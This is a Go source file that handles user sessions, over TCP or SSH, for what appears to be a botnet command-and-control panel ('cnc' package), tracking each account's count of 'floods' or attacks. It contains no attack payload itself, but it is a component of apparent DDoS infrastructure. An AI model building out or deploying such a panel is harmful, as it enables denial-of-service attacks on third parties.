package sessions

import (
    "cnc/core/database"
    "cnc/core/utils"
    "fmt"
    "io"
    "net"
    "sync"
    "time"
)

var (
    Sessions     = make(map[int64]*Session)
    SessionMutex sync.Mutex
)

type Session struct {
    ID       int64
    Username string
    Conn     net.Conn
    Account  database.AccountInfo
    Floods   int

    Chat     bool
    isSSH    bool
    sshConn  io.ReadWriteCloser
}

func NewSession(conn net.Conn, username string, account database.AccountInfo) *Session {
    return &Session{
        ID:       time.Now().UnixNano(),
        Username: username,
        Conn:     conn,
        Account:  account,
        Floods:   0,
        isSSH:    false,
    }
}

func NewSSHSession(sshConn io.ReadWriteCloser, username string, account database.AccountInfo) *Session {
    return &Session{
        ID:       time.Now().UnixNano(),
        Username: username,
        Conn:     nil,
        sshConn:  sshConn,
        Account:  account,
        Floods:   0,
        isSSH:    true,
    }
}

func (s *Session) Remove() {
    utils.Infof("Session closed")
    SessionMutex.Lock()
    delete(Sessions, s.ID)
    SessionMutex.Unlock()
}

func (s *Session) FetchAttacks(username string) {
    totalAttacks, err := database.DatabaseConnection.GetTotalAttacks(username)
    if err != nil {
        utils.Errorf("[Session - FetchAttacks] %s", err)
        return
    }

    s.Floods = totalAttacks
}

func (s *Session) write(data []byte) (n int, err error) {
    if s.isSSH && s.sshConn != nil {
        return s.sshConn.Write(data)
    } else if s.Conn != nil {
        return s.Conn.Write(data)
    }
    return 0, io.EOF
}

func (s *Session) Print(data ...interface{}) {
    _, _ = s.write([]byte(fmt.Sprint(data...)))
}

func (s *Session) Printf(format string, val ...any) {
    s.Print(fmt.Sprintf(format, val...))
}

func (s *Session) Println(data ...interface{}) {
    s.Print(fmt.Sprint(data...) + "\r\n")
}

func (s *Session) Clear() {
    s.Printf("\x1bc")
}
